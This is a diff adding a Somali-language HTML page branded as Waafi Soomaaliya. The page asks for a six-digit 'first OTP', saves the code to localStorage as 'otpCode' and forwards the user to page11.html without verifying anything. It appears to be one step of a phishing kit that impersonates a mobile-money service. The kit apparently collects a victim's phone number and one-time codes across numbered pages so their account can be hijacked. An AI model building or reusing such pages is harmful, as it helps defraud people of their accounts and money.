@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="so">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>OTP Verification</title>
+
+<style>
+
+body{
+    margin:0;
+    font-family:Arial, sans-serif;
+    background:#f4f4f4;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+/* CARD */
+.card{
+    background:white;
+    width:90%;
+    max-width:400px;
+    padding:30px 20px;
+    border-radius:20px;
+    text-align:center;
+    box-shadow:0 5px 20px rgba(0,0,0,0.1);
+}
+
+h2{
+    margin-bottom:10px;
+}
+
+.phone{
+    font-size:18px;
+    margin:15px 0;
+}
+
+/* OTP BOXES */
+.otp-container{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin:20px 0;
+}
+
+.otp{
+    width:45px;
+    height:50px;
+    font-size:22px;
+    text-align:center;
+    border:2px solid #6cc04a;
+    border-radius:10px;
+    outline:none;
+}
+
+/* BUTTON */
+button{
+    width:100%;
+    padding:15px;
+    border:none;
+    border-radius:10px;
+    background:#ccc;
+    color:white;
+    font-size:16px;
+    margin-top:20px;
+}
+
+button.active{
+    background:#6cc04a;
+}
+
+.footer{
+    margin-top:25px;
+    color:#777;
+    font-size:13px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<h2>Xaqiijinta OTP-ga Kowaad</h2>
+
+<p>Geli OTP-ga kowaad ee loogu diray lambarka taleefankaaga</p>
+
+<div class="phone" id="phoneNumber"></div>
+
+<!-- OTP INPUTS -->
+<div class="otp-container">
+<input class="otp" maxlength="1">
+<input class="otp" maxlength="1">
+<input class="otp" maxlength="1">
+<input class="otp" maxlength="1">
+<input class="otp" maxlength="1">
+<input class="otp" maxlength="1">
+</div>
+
+<p>Koodka mar kale u dir 28 ilbiriqsi</p>
+
+<button id="verifyBtn">XAQIIJI OTP-GA KOWAAD</button>
+
+<div class="footer">© 2026 Waafi Soomaaliya</div>
+
+</div>
+
+<script>
+
+/* ===============================
+   LOAD PHONE NUMBER FROM PAGE 9
+================================ */
+
+const phone = localStorage.getItem("phoneNumber");
+
+if(!phone){
+    alert("Number missing");
+    window.location.href="page3.html";
+}
+
+document.getElementById("phoneNumber").innerText = phone;
+
+
+/* ===============================
+   OTP AUTO INPUT
+================================ */
+
+const inputs = document.querySelectorAll(".otp");
+const btn = document.getElementById("verifyBtn");
+
+inputs.forEach((input,index)=>{
+
+    input.addEventListener("input",()=>{
+
+        if(input.value.length === 1 && index < inputs.length-1){
+            inputs[index+1].focus();
+        }
+
+        checkOTP();
+    });
+
+});
+
+
+function checkOTP(){
+
+    let code = "";
+
+    inputs.forEach(i => code += i.value);
+
+    if(code.length === 6){
+        btn.classList.add("active");
+        btn.disabled = false;
+    }else{
+        btn.classList.remove("active");
+        btn.disabled = true;
+    }
+}
+
+
+/* ===============================
+   VERIFY BUTTON
+================================ */
+
+btn.addEventListener("click",()=>{
+
+    let otp = "";
+
+    inputs.forEach(i => otp += i.value);
+
+    localStorage.setItem("otpCode", otp);
+
+    // move to next page
+    window.location.href = "page11.html";
+});
+
+</script>
+
+</body>
+</html>
